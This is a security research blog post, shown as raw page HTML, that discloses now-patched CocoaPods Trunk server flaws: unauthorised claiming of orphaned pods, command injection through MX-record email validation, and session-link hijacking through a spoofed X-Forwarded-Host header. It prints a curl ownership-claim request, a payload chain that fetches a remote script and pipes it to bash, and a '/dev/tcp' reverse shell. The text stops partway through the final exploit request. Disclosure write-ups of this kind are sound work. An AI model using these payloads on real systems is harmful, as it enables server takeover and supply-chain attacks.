<!DOCTYPE html><!-- This site was created in Webflow. https://webflow.com --><!-- Last Published: Sun Jan 05 2025 14:53:32 GMT+0000 (Coordinated Universal Time) --><html data-wf-domain="evasec.webflow.io" data-wf-page="6637ec84acdca762bbea2e48" data-wf-site="6637ec84acdca762bbea2e39" lang="en" data-wf-locale="en" data-wf-collection="6637ec84acdca762bbea2e60" data-wf-item-slug="eva-discovered-supply-chain-vulnerabities-in-cocoapods"><head><meta charset="utf-8"/><title>Vulnerabilities in CocoaPods Open the Door to Supply Chain Attacks Against Thousands of iOS and MacOS Applications</title><meta content="Multiple vulnerabilities affecting the CocoaPods ecosystem, have been discovered, posing a major risk of supply chain attacks." name="description"/><meta content="Vulnerabilities in CocoaPods Open the Door to Supply Chain Attacks Against Thousands of iOS and MacOS Applications | E.V.A" property="og:title"/><meta content="Multiple vulnerabilities affecting the CocoaPods ecosystem, have been discovered, posing a major risk of supply chain attacks." property="og:description"/><meta content="https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/666ee5b3de77bc88bb5dc068_EVA_Infographics_Cover_A.jpg" property="og:image"/><meta content="Vulnerabilities in CocoaPods Open the Door to Supply Chain Attacks Against Thousands of iOS and MacOS Applications | E.V.A" property="twitter:title"/><meta content="Multiple vulnerabilities affecting the CocoaPods ecosystem, have been discovered, posing a major risk of supply chain attacks." property="twitter:description"/><meta content="https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/666ee5b3de77bc88bb5dc068_EVA_Infographics_Cover_A.jpg" property="twitter:image"/><meta property="og:type" content="website"/><meta content="summary_large_image" name="twitter:card"/><meta content="width=device-width, initial-scale=1" name="viewport"/><meta content="Webflow" name="generator"/><link href="https://cdn.prod.website-files.com/6637ec84acdca762bbea2e39/css/evasec.webflow.77f9b2d79.css" rel="stylesheet" type="text/css"/><link href="https://fonts.googleapis.com" rel="preconnect"/><link href="https://fonts.gstatic.com" rel="preconnect" crossorigin="anonymous"/><script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript"></script><script type="text/javascript">WebFont.load({  google: {    families: ["Roboto Condensed:300,300italic,regular,italic,700,700italic","Roboto:regular,500,700"]  }});</script><script type="text/javascript">!function(o,c){var n=c.documentElement,t=" w-mod-";n.className+=t+"js",("ontouchstart"in o||o.DocumentTouch&&c instanceof DocumentTouch)&&(n.className+=t+"touch")}(window,document);</script><link href="https://cdn.prod.website-files.com/63302495047920513dbc3f3a/63444461b973188f92cd0ffd_favicon.png" rel="shortcut icon" type="image/x-icon"/><link href="https://cdn.prod.website-files.com/63302495047920513dbc3f3a/6344438f0d9ef06a5fe0300e_webclip%20256x256.png" rel="apple-touch-icon"/><script async="" src="https://www.googletagmanager.com/gtag/js?id=G-MGQ0PWW7EX"></script><script type="text/javascript">window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());gtag('set', 'developer_id.dZGVlNj', true);gtag('config', 'G-MGQ0PWW7EX');</script><link rel="stylesheet"
      href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.6.0/build/styles/default.min.css">
<!-- [Attributes by Finsweet] Social Share -->
<script defer src="https://cdn.jsdelivr.net/npm/@finsweet/attributes-socialshare@1/socialshare.js"></script>

<!-- [Attributes by Finsweet] Powerful Rich Text -->
<script defer src="https://cdn.jsdelivr.net/npm/@finsweet/attributes-richtext@1/richtext.js"></script>

<style>
.w-code-block {
    margin: unset;
    border-radius: .25rem;
    font-size: 16px;
}
.toc-h3 {
    margin-left: 1rem;
}

.cool-inline{
	border-radius: .375rem;
  overflow: clip;
  background-color: #F0F8FB;
  color: #2988A1;
  padding: 0.25rem 0.5rem;
  margin-bottom: 0.55rem;
  margin-top: -1rem;
  display: inline-block;
}
  
</style></head><body class="new-body"><header class="navbar"><div data-animation="default" data-collapse="medium" data-duration="400" data-easing="ease" data-easing2="ease" role="banner" class="navbar-no-shadow-container w-nav"><div class="container-regular"><div class="navbar-wrapper"><a href="/" class="navbar-brand w-nav-brand"><img src="https://cdn.prod.website-files.com/6637ec84acdca762bbea2e39/6637ec84acdca762bbea2ea5_Asset%202.png" loading="lazy" width="70" alt=""/></a><nav role="navigation" class="nav-menu-wrapper w-nav-menu"><ul role="list" class="nav-menu w-list-unstyled"><li><a href="/" class="nav-link">Home</a></li><li><a href="/services" class="nav-link">Services</a></li><li><a href="/blog" class="nav-link">Blog</a></li><li><a href="/about-us" class="nav-link">About us</a></li><li><a href="/contact-us" class="nav-link">Contact us</a></li></ul></nav><div class="menu-button w-nav-button"><div class="html-embed-4 w-embed"><svg xmlns="http://www.w3.org/2000/svg" width="22" height="16" viewBox="0 0 22 16">
  <g id="Group_1" data-name="Group 1" transform="translate(-1517 -421)">
    <line id="Line_1" data-name="Line 1" x1="20" transform="translate(1518 422)" fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"/>
    <line id="Line_3" data-name="Line 3" x1="20" transform="translate(1518 436)" fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"/>
    <line id="Line_4" data-name="Line 4" x1="18" transform="translate(1520 429)" fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"/>
  </g>
</svg></div></div></div></div></div><div class="navbar-background-wrap"><div class="navbar-background white"></div><div class="navbar-background black"></div></div></header><div class="w-embed"><style>
.author-name-item:last-child .comma {
    display: none;
}
code {
    white-space: break-spaces;
}
</style></div><div class="progress-wrap"><div class="progress-bar"></div></div><div class="section article"><div class="container-small"><div class="div-block-39"><div class="blog-tag">Research</div><div class="blog-date">July 1, 2024</div><h1 class="blog-title">Vulnerabilities in CocoaPods Open the Door to Supply Chain Attacks Against Thousands of iOS and MacOS Applications</h1><p class="blog-intro">Multiple vulnerabilities affecting the CocoaPods ecosystem, have been discovered, posing a major risk of supply chain attacks.</p><div class="post-bio"><div class="author-bio"><div class="w-dyn-list"><div role="list" class="author-image-list w-dyn-items"><div role="listitem" class="author-image-item w-dyn-item"><img src="https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/667edfaf3163605ea44d1da0_portrait2.jpg" loading="lazy" alt="" sizes="(max-width: 479px) 21vw, 53.99857711791992px" srcset="https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/667edfaf3163605ea44d1da0_portrait2-p-500.jpg 500w, https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/667edfaf3163605ea44d1da0_portrait2-p-800.jpg 800w, https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/667edfaf3163605ea44d1da0_portrait2-p-1080.jpg 1080w, https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/667edfaf3163605ea44d1da0_portrait2-p-1600.jpg 1600w, https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/667edfaf3163605ea44d1da0_portrait2-p-2000.jpg 2000w, https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/667edfaf3163605ea44d1da0_portrait2.jpg 2442w" class="author-image"/></div><div role="listitem" class="author-image-item w-dyn-item"><img src="https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/665519d6eeeaa979ade532b3_PHOTO-2024-05-28-01-38-28.jpg" loading="lazy" alt="" class="author-image"/></div></div></div><div class="author-name-wrap w-dyn-list"><div role="list" class="w-dyn-items"><div role="listitem" class="author-name-item w-dyn-item"><a href="https://www.linkedin.com/in/reef-spektor-02988418b" target="_blank" class="link-2 inline">Reef Spektor</a><header class="navbar"><div data-animation="default" data-collapse="medium" data-duration="400" data-easing="ease" data-easing2="ease" role="banner" class="navbar-no-shadow-container w-nav"><div class="container-regular"><div class="navbar-wrapper"><a href="/" class="navbar-brand w-nav-brand"><img src="https://cdn.prod.website-files.com/6637ec84acdca762bbea2e39/6637ec84acdca762bbea2ea5_Asset%202.png" loading="lazy" width="70" alt=""/></a><nav role="navigation" class="nav-menu-wrapper w-nav-menu"><ul role="list" class="nav-menu w-list-unstyled"><li><a href="/" class="nav-link">Home</a></li><li><a href="/services" class="nav-link">Services</a></li><li><a href="/blog" class="nav-link">Blog</a></li><li><a href="/about-us" class="nav-link">About us</a></li><li><a href="/contact-us" class="nav-link">Contact us</a></li></ul></nav><div class="menu-button w-nav-button"><div class="html-embed-4 w-embed"><svg xmlns="http://www.w3.org/2000/svg" width="22" height="16" viewBox="0 0 22 16">
  <g id="Group_1" data-name="Group 1" transform="translate(-1517 -421)">
    <line id="Line_1" data-name="Line 1" x1="20" transform="translate(1518 422)" fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"/>
    <line id="Line_3" data-name="Line 3" x1="20" transform="translate(1518 436)" fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"/>
    <line id="Line_4" data-name="Line 4" x1="18" transform="translate(1520 429)" fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"/>
  </g>
</svg></div></div></div></div></div><div class="navbar-background-wrap"><div class="navbar-background white"></div><div class="navbar-background black"></div></div></header><div class="comma">,</div></div><div role="listitem" class="author-name-item w-dyn-item"><a href="https://www.linkedin.com/in/eran-vaknin" target="_blank" class="link-2 inline">Eran Vaknin</a><header class="navbar"><div data-animation="default" data-collapse="medium" data-duration="400" data-easing="ease" data-easing2="ease" role="banner" class="navbar-no-shadow-container w-nav"><div class="container-regular"><div class="navbar-wrapper"><a href="/" class="navbar-brand w-nav-brand"><img src="https://cdn.prod.website-files.com/6637ec84acdca762bbea2e39/6637ec84acdca762bbea2ea5_Asset%202.png" loading="lazy" width="70" alt=""/></a><nav role="navigation" class="nav-menu-wrapper w-nav-menu"><ul role="list" class="nav-menu w-list-unstyled"><li><a href="/" class="nav-link">Home</a></li><li><a href="/services" class="nav-link">Services</a></li><li><a href="/blog" class="nav-link">Blog</a></li><li><a href="/about-us" class="nav-link">About us</a></li><li><a href="/contact-us" class="nav-link">Contact us</a></li></ul></nav><div class="menu-button w-nav-button"><div class="html-embed-4 w-embed"><svg xmlns="http://www.w3.org/2000/svg" width="22" height="16" viewBox="0 0 22 16">
  <g id="Group_1" data-name="Group 1" transform="translate(-1517 -421)">
    <line id="Line_1" data-name="Line 1" x1="20" transform="translate(1518 422)" fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"/>
    <line id="Line_3" data-name="Line 3" x1="20" transform="translate(1518 436)" fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"/>
    <line id="Line_4" data-name="Line 4" x1="18" transform="translate(1520 429)" fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"/>
  </g>
</svg></div></div></div></div></div><div class="navbar-background-wrap"><div class="navbar-background white"></div><div class="navbar-background black"></div></div></header><div class="comma">,</div></div></div></div><div class="div-block-42"><div time-to-read=".blog-rich-text" class="read-time">X</div><div class="read-time"> minutes read</div></div></div><div id="w-node-_513710c8-0807-7a81-0a44-7f8d26147400-bbea2e48" class="social-media-list"><a fs-socialshare-element="Twitter" href="#" class="social-link w-inline-block"><img src="https://cdn.prod.website-files.com/6637ec84acdca762bbea2e39/6637ec84acdca762bbea2ee7_x.svg" loading="lazy" alt="" class="social-icon"/></a><a fs-socialshare-element="LinkedIn" href="#" class="social-link w-inline-block"><img src="https://cdn.prod.website-files.com/6637ec84acdca762bbea2e39/6637ec84acdca762bbea2ee8_linkedin.svg" loading="lazy" alt="" class="social-icon"/></a><a fs-socialshare-element="Reddit" href="#" class="social-link w-inline-block"><img src="https://cdn.prod.website-files.com/6637ec84acdca762bbea2e39/6637ec84acdca762bbea2ee9_reddit.svg" loading="lazy" alt="" class="social-icon"/></a></div></div></div><div class="main-image-wrap"><img src="https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/666ee5b3de77bc88bb5dc068_EVA_Infographics_Cover_A.jpg" loading="lazy" alt="" sizes="(max-width: 767px) 90vw, (max-width: 991px) 86vw, (max-width: 1439px) 85vw, 1080px" srcset="https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/666ee5b3de77bc88bb5dc068_EVA_Infographics_Cover_A-p-500.jpg 500w, https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/666ee5b3de77bc88bb5dc068_EVA_Infographics_Cover_A-p-800.jpg 800w, https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/666ee5b3de77bc88bb5dc068_EVA_Infographics_Cover_A-p-1080.jpg 1080w, https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/666ee5b3de77bc88bb5dc068_EVA_Infographics_Cover_A-p-1600.jpg 1600w, https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/666ee5b3de77bc88bb5dc068_EVA_Infographics_Cover_A.jpg 1920w" class="blog-image-thumbnail full"/></div></div><div class="container-xlarge"><div class="article-wrap"><div id="w-node-_450aa6ab-01e2-a3e6-4f71-68882238a9c9-bbea2e48" class="toc"><div class="toc-title"><br/>Contents</div><div id="toc"></div></div><div id="w-node-_5c543bd1-6702-5b44-01af-998f356d4485-bbea2e48" class="div-block-40"><div id="content" fs-richtext-element="rich-text" class="blog-rich-text w-richtext"><h2>TL;DR<br/></h2><ul role="list"><li>E.V.A Information Security researchers uncovered several vulnerabilities in the CocoaPods dependency manager that allows any malicious actor to claim ownership over thousands of unclaimed pods and insert malicious code into many of the most popular iOS and MacOSÂ applications. These vulnerabilities have since been patched.</li><li>Such an attack on theÂ mobile app ecosystem could infect almost every Apple device, leaving thousands of organizations vulnerable to catastrophic financial and reputational damage. One of the vulnerabilities could also enable zero day attacks against the most advanced and secure organizationsâ infrastructure.Â Â </li><li>Developers and DevOps teams that have used CocoaPods in recent years should verify the integrity of open source dependencies used in their application code.</li><li>Dependency managers are an often-overlooked aspect of software supply chain security. Security leaders should explore ways to increase governance and oversight over the use these tools.</li></ul><h2>Spilling the CocoaBeans</h2><p>Open source code is ubiquitous in modern software development. When reviewing client code, itâs not unusual for us to find that 70-80% is composed of open source libraries, packages, or frameworks. While adoption of open source is practically inevitable, it also increases the risk of software supply chain attacks. Once an open source package is integrated into a company&#x27;s continuous integration and continuous delivery (CI/CD) pipeline, there is a risk that the package could be compromised or manipulated to inject malicious code or vulnerabilities into any applications built using that pipeline. In recent years, many such attacks have occurred (<a href="https://en.wikipedia.org/wiki/Log4Shell">Log4Shell</a> is probably the most famous example).</p><p>With about 100,000 libraries used in over 3 million mobile apps, <a href="https://cocoapods.org/">CocoaPods</a> is an open source dependency manager for Swift and Objective-C projects. Dependency managers such as CocoaPods and others (including NPM, Maven, and PyPI) play a critical role in open source software supply chains. By checksumming and cryptographically signing packages, they allow developers to verify the integrity and authenticity of the components theyâre using. However, compromise of the dependency manager itself poses a severe threat. Attackers who infiltrate the servers or developer accounts of these tools could push malicious updates that spread widely.Â </p><p>As part of a red team exercise for a customer, we have discovered several critical vulnerabilities in the mechanisms used to manage packages and verify their owners on the CocoaPods server. </p><h2>Vulnerabilities in the CocoaPods Ecosystem</h2><ul role="list"><li>A 2014 migration process left thousands of orphaned packages (where the original owner is unknown), many of which are still widely used in other libraries. Using a public API and an email address that was available in the CocoaPods source code, an attacker could claim ownership over any of these packages, which would then allow the attacker to replace the original source code with their own malicious code.</li><li>An insecure email verification workflow could be exploited to run arbitrary code on the CocoaPods âTrunkâ server (manages the distribution and metadata of Â <a href="https://guides.cocoapods.org/syntax/podspec.html">Podspecs</a>), which would allow an attacker to manipulate or replace the packages being downloaded.Â </li><li>By spoofing an HTTP header and taking advantage of misconfigured email security tools, attackers could execute a zero-click attack that grants them access to a developerâs account verification token. This would allow attackers to change packages on the CocoaPods server and result in supply chain and zero day attacks.Â </li><li>A separate vulnerability would allow an attacker to infiltrate the CocoaPods âTrunkâ server and perform a near-unlimited range of exploits..Â </li></ul><h2>Who is Vulnerable</h2><p>The short answer is that a significant percentage of the Swift and Objective-C application ecosystem (including iOS, macOS, and other Apple device software) was susceptible to supply chain and zero-click attacks, with an estimated range of thousands to millions of apps.</p><p>As with many software supply chain attacks, opaque dependencies in closed-source code mean it is almost impossible to understand the potential harm. The vulnerabilities we discovered could be used to control the dependency manager itself, and any published package.<br/><a href="https://en.wikipedia.org/wiki/Downstream_(software_development)">Downstream dependencies</a> could mean that thousands of applications and millions of devices were exposed over the last few years.Â </p><p>Special attention needs to be paid to <strong>software that relies on orphaned CocoaPod packages</strong> (i.e., which do not have an owner assigned to them - more on this below).Â </p><p>&lt;figure class=&quot;w-richtext-align-fullwidth w-richtext-figure-type-image&quot;&gt;&lt;div&gt;&lt;img src=&quot;https://eva-research.imgix.net/EVA_Infographics_gif1.gif&quot; loading=&quot;lazy&quot; alt=&quot;&quot; class=&quot;medium-zoom-image&quot;&gt;&lt;/div&gt;&lt;/figure&gt;</p><h2>The Potential Impact</h2><p>CocoaPods is the most popular choice among iOS developers. Many of the potentially impacted artifacts are dependencies for projects maintained by major companies such as Google, GitHub, Amazon, Dropbox, and more - which puts the projects and downstream dependencies at risk.</p><p>These potential affected end-user apps deployed on millions (billions?)Â of devices could damage users and companies reputations. Many applications can access a userâs most sensitive information: credit card details, medical records, private materials, and more. Injecting code into these applications could enable attackers to access this information for almost any malicious purpose imaginable - ransomware, fraud, blackmail, corporate espionageâ¦ In the process, it could expose companies to major legal liabilities and reputational risk.</p><h2>Actions Developers Should Take</h2><p>Developers and organizations are advised to review dependency lists and package managers used in their applications, validate checksums of third-party libraries, perform periodic scans to detect malicious code or suspicious changes, keep software updated and limit use of orphaned or unmaintained packages.</p><p>If CocoaPods was in use in your organization before October 2023, you should take extra care to perform the steps detailed under <a href="#technical-remediation-steps">Technical Remediation Steps</a>.</p><h2>Vulnerabilities Disclosure</h2><p>We <a href="https://blog.cocoapods.org/CocoaPods-Trunk-RCEs-2023/">informed CocoaPods</a> and provided the full details of the vulnerabilities according to the responsible disclosure guidelines which since patched.</p><h2>&lt;u&gt;Technical Details&lt;/u&gt;</h2><h2>#1: Taking Unauthorized Ownership over Orphaned Pods</h2><p>A Podspec is a specification file used by CocoaPods to describe a package, known as a Pod. It includes metadata like the name, version, source files, dependencies, and other information required to correctly integrate that Pod into an iOS or macOS project. When contributing a Podspec to CocoaPods, the authors are required to register an account. In their account, they can store and maintain their Pods and Podspecs. Authors are entitled to upload new packages and update existing ones.</p><p>Cocoapods originally identified the authors using their GitHub-associated accounts. In May 2014, CocoaPods announced a migration to a new <a href="https://github.com/CocoaPods/trunk.cocoapods.org">&#x27;Trunkâ server</a>, which now acts as a centralized repository and distribution platform for CocoaPods. The migration would allow Podspec authors to publish their Pods and make them available to the community using a new web service application. The new flow included email validation, and was probably meant to improve security.</p><p>As part of the migration, authorship of all previously uploaded Pods was reset. Authors were asked to claim ownership of their Pods in order to retain control over their contents. However, many of the original Podspec authors did not do so, resulting in many pods left unclaimed (orphaned). At the time of this writing, there are <a href="https://cocoapods.org/owners/7">1,866 orphaned pods</a>.</p><h3>The vulnerabilityÂ (CVE-2024-38368)</h3><p>By analyzing the source code of the âTrunkâ server, we noticed that all orphan pods were associated with a default CocoaPods owner, and the email created for this default owner was <a href="mailto:unclaimed-pods@cocoapods.org">unclaimed-pods@cocoapods.org</a>.Â </p><p>In addition, we noticed that the public API endpoint to claim a pod was still available and the API allowed anyone to claim orphaned pods without any ownership verification process.Â </p><figure style="max-width:1482pxpx" class="w-richtext-align-fullwidth w-richtext-figure-type-image"><div><img src="https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/677b074fa2a8f8f43a1de23c_665b731f0cb57120e44a4f56_claimscontroller.png" loading="lazy" alt=""/></div><figcaption>Trunk server&#x27;s App controller including &quot;temporary&quot;Â <strong>/claims </strong>routes</figcaption></figure><h3>The exploit</h3><p>By making a straightforward curl request to the publicly-available API, and supplying the unclaimed targeted pod name, the door was wide open for a potential attacker to claim any or all of these orphaned Pods as their own:</p><div class="w-embed"><pre>
<code class="language-bash"># Curl request for changing ownership of a targeted orphaned pod
curl -X 'POST' \
  -H 'Host: trunk.cocoapods.org' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-binary 'owner[name]=EVA&email=research@evasec.io'
  --data-binary 'pods[]=[TARGET_UNCLAIMED_POD]&button=SEND'
  'https://trunk.cocoapods.org/claims'
</code>
</pre></div><p>At this point, the attacker would be able to manipulate the source code or insert malicious content into the newly-claimed Pod. This pod would then go on to infect many downstream dependencies, and potentially find its way into <strong>a large percentage of Apple devices currently in use</strong>.</p><figure style="max-width:2133pxpx" class="w-richtext-align-fullwidth w-richtext-figure-type-image"><div><img src="https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/677b0750a2a8f8f43a1de2c0_666ee4f103b80163c26b4a95_EVA_InfoGraphics_C1.jpeg" loading="lazy" alt=""/></div></figure><h3>The implications</h3><p>â<strong>Many of these unclaimed Pods are still in wide use.</strong> Orphaned Pods are used as dependencies of many other packages available on CocoaPods. For example, we found mentions of orphaned Pods in the documentation or terms of service documents of applications provided by Meta (Facebook, Whatsapp), Apple (Safari, AppleTV, Xcode), and Microsoft (Teams); as well as in TikTok, Snapchat, Amazon, LinkedIn, Netflix, Okta, Yahoo, Zynga, and many more. Overall we found 685 Pods that had an explicit dependency using an orphaned Pod; doubtless there are hundreds or thousands more in proprietary codebases. All of these were, at some period or another, vulnerable to the supply chain attack described below.Â </p><p>By taking ownership of a part of the iOS/macOS app supply chain, and based on the documented dependencies we mentioned above, an attacker would have free reign to access millions of mobile apps and the hundreds of millions of people that use them.Â </p><h2>#2: Remote Code Execution on the CocoaPods &#x27;Trunk&#x27; Server</h2><p>On February 8, 2014, a change was <a href="https://github.com/CocoaPods/trunk.cocoapods.org/commit/70c56fba99d53fa5a8930dd4d0d392e4c99a56c4">committed</a> to the CocoaPods âTrunkâ source code, implementing MX record validation to registered emails. These changes created a new attack path that was identified by analyzing the registration flow.</p><ol role="list"><li>To register as pod owner using the CocoaPods CLI tool, developers provide their email, name, and account description.</li><li>The server verifies the email&#x27;s uniqueness and checks if it follows the correct format, according to the<a href="https://datatracker.ietf.org/doc/html/rfc822"> RFC822</a> standard (using regular expressions).</li><li>The server then examines the email address domain&#x27;s Mail Exchanger (MX) records to confirm email validity, using the RFC-822 ruby <a href="https://github.com/dim/rfc-822">package</a></li><li>If everything checks out, the developer&#x27;s owner account is created, allowing them to access the âTrunkâ server and manage owned CocoaPod packages.</li></ol><h3>The vulnerability (CVE-2024-38366)</h3><p>The changes include a new verification process for the user-provided email address, utilizing a third-party ruby gem package <a href="https://github.com/dim/rfc-822">rfc-822</a>.</p><figure style="max-width:2610pxpx" class="w-richtext-align-fullwidth w-richtext-figure-type-image"><div><img src="https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/677b074fa2a8f8f43a1de273_66547c29f67b1ab7f79b21e6_commit.png" loading="lazy" alt=""/></div><figcaption><em>CocoaPods âTrunkâ server commit - implementing rfc822 host validation</em></figcaption></figure><p>The <em>validates_mx_records</em> method declared through lines 70-73, calls <em>RFC822.mx_records</em> method.</p><p>Unfortunately, RFC822 has several vulnerable methods:</p><p><strong>Lines 36-47 - <em>mx_records</em> method</strong> receives an email address as input parameter, validates it against the moduleâs EMAIL regex pattern (line 38). Following the regex validation, the <em>raw_mx_records </em>method is called with the domain part of the email address, split from the provided email address (line 41)</p><figure style="max-width:1600pxpx" class="w-richtext-align-fullwidth w-richtext-figure-type-image"><div><img src="https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/677b074fa2a8f8f43a1de248_66546f31b3de5dfcd5785f3b_xOOC9SSDj2wOo_8bNTchKPo9_5I9sxxj47l4_LMIjmZLYJVugCz16zfzH-8TADNrDxSpwoktWUUMvT4xtWmNuYZEit6_jchmxxyTwXqPLLKihJK5lkxh6PBL6oRWwQPHpLJrNjJhyz6hydOcLqaCcJ4.png" loading="lazy" alt=""/></div><figcaption>rfc-822 implementation of the vulnerable methods</figcaption></figure><p><strong>Lines 49-51 - <em>raw_mx_records</em></strong> method receives the domain part of the email address and forwards it to <em>host_mx </em>method for online DNS MX record validation. The output is executed against a regex pattern to obtain the relevant host.</p><p><strong>Lines 53-55 - <em>host_mx </em></strong>method executes an arbitrary OS command <em>â/usr/bin/env host -t MX #{domain}â</em>, concatenating it with the user-provided emailâs domain which makes it vulnerable to a Command Injection attack.</p><h3>The exploit</h3><p>&lt;figure class=&quot;w-richtext-align-fullwidth w-richtext-figure-type-image&quot;&gt;&lt;div&gt;&lt;img src=&quot;https://eva-research.imgix.net/EVA_Infographics_gif3.gif&quot; loading=&quot;lazy&quot; alt=&quot;&quot; class=&quot;medium-zoom-image&quot;&gt;&lt;/div&gt;&lt;/figure&gt;</p><p>To pop a new reverse shell from the âTrunkâ server, we needed to come up with the following set of payloads:</p><p>Email address to register with:</p><p>&lt;span class=&quot;cool-inline&quot;&gt;<em>name@pwn.evaresearch.com|bash</em>&lt;/span&gt;</p><p>MX record of pwn.evaresearch.com:</p><p>&lt;span class=&quot;cool-inline&quot;&gt;<em>10 a||{curl, -s,http://serve.evasecresearch.com/payload.txt}|bash||.com</em>&lt;/span&gt;</p><p>Serve the following payload file at http://serve.evasecresearch.com/payload.txt:</p><p>&lt;span class=&quot;cool-inline&quot;&gt;<em>sh -i &gt;&amp; /dev/tcp/SERVER/1337 0&gt;&amp;1</em>&lt;/span&gt;</p><p>As mentioned earlier, the method<em> rfc-822.rb#host_mx </em>is executing OS<em> âhostâ</em> command against the provided email address without proper validation, allowing us to inject a trailing âbashâ command (<strong><em>|bash</em></strong>) against any resolution of our controlled MX record domain. This means that any MX record resolution value containing a valid bash command syntax will be executed on the âTrunkâ server in the context of the âhostâ command.</p><p>In our example above, weâve served a reverse shell payload (payload.txt file) via our controlled HTTP server.</p><figure style="padding-bottom:56.206088992974244%" class="w-richtext-align-fullwidth w-richtext-figure-type-video"><div><iframe allowfullscreen="true" frameborder="0" scrolling="no" src="https://www.youtube.com/embed/nO84n2v3ZyM" title=""></iframe></div></figure><p>&lt;b&gt;For a comprehensive exploration of the research process behind this vulnerability, <a href="https://github.com/ReeFSpeK/CocoaPods-RCE">click here</a>&lt;/b&gt;</p><h3>The implications</h3><p>If an unauthorized threat actor compromises the server, they could potentially dump all pod ownersâ session tokens, poison clientâs traffic or even shut down the server completely.Â </p><h2>#3: Achieving Zero-Click Account Takeover by Defeating Email Security Boundaries</h2><p>Several HTTP headers present opportunities for attackers, notably including <a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn">HTTP smuggling and desynchronization attacks</a> (credit to <a href="https://portswigger.net/research/james-kettle">James Kettle</a> for research around those interesting topics). These attacks exploit variations in how servers and proxies interpret headers, enabling malicious requests to deceive systems, and potentially leading to unintended actions or securityÂ bypasses.Â </p><p>&lt;figure class=&quot;w-richtext-align-fullwidth w-richtext-figure-type-image&quot;&gt;&lt;div&gt;&lt;img src=&quot;https://eva-research.imgix.net/EVA_Infographics_gif2.gif&quot; loading=&quot;lazy&quot; alt=&quot;&quot; class=&quot;medium-zoom-image&quot;&gt;&lt;/div&gt;&lt;/figure&gt;</p><p>CocoaPods authenticates a new device through a session creation process. This starts with a request sent by the client to the âTrunkâ server in order to obtain a session. The client provides <strong>only</strong> its email address as the authentication method; however, the session will not be valid until the owner visits a link sent to their mailbox.</p><figure style="max-width:1276pxpx" class="w-richtext-align-fullwidth w-richtext-figure-type-image"><div><img src="https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/677b074fa2a8f8f43a1de258_6655bc6a4e978ffa35433c15_registercocoa.png" loading="lazy" alt=""/></div></figure><figure style="max-width:1156pxpx" class="w-richtext-align-fullwidth w-richtext-figure-type-image"><div><img src="https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/677b074fa2a8f8f43a1de23f_6655bde90e4b16653f24e8f6_cocoaemail.png" loading="lazy" alt=""/></div></figure><h3>The vulnerability (CVE-2024-38367)</h3><p>According to <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-Host">MDN</a>: âThe X-Forwarded-Host (XFH) header is a de-facto standard header for identifying the original host requested by the client in the <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Host">Host</a> HTTP request headerâ.<br/></p><p>We found that the server will accept a spoofed XFH header and use it explicitly to construct a URL sent to the client for verifying the session.</p><p>For example, an attacker can inject the following header to spoof the generated session validation link:</p><p><em>X-Forwarded-Host: </em><strong><em>research</em></strong><em>.</em><strong><em>evasec.io â </em></strong><em>https://</em><strong><em>research</em></strong><em>.</em><strong><em>evasec.io</em></strong><em>/sessions/verify/[TOKEN]<sub>â</sub></em></p><p><em><sub>â<br/></sub></em>The vulnerability exists in the âTrunkâ server source code, in the <em>sessions_controller</em> class where the application is constructing the session validation url.</p><figure style="max-width:3232pxpx" class="w-richtext-align-fullwidth w-richtext-figure-type-image"><div><img src="https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/677b074fa2a8f8f43a1de242_66548229bf07b0f45cc98774_sessions_controller.rb%2520new.png" loading="lazy" alt=""/></div><figcaption><em>sessions_controller.rb: session creation controller action implementation</em></figcaption></figure><p><strong>Lines 21-22 -</strong> The domain part of the session verification URL is constructed using the <strong>request.host_wth_port </strong>method. Also, a new session is created and the generated link is sent via email.</p><p>Further analysis of the <strong><em>request.host_wth_port </em></strong>Rack (Rails) method reveals that the method implementation prioritizes the <em>X-Forwarded-Host</em> header over the original <em>Host</em> header or any other environment value to determine the hostname of the web server.Â </p><figure style="max-width:1858pxpx" class="w-richtext-align-fullwidth w-richtext-figure-type-image"><div><img src="https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/677b074fa2a8f8f43a1de239_66548294835438fb472e46db_ruby-rack%2520method%2520-new.png" loading="lazy" alt=""/></div><figcaption><strong><em>Rack::Request#host_with_port </em></strong><em>method implementation</em></figcaption></figure><h3>The exploit</h3><p>To exploit this vulnerability, an attacker can send the following request including the spoofed XFH header:</p><div class="w-embed"><pre><code class="language-http">POST /api/v1/sessions HTTP/1.1
Host: trunk.cococapods.org
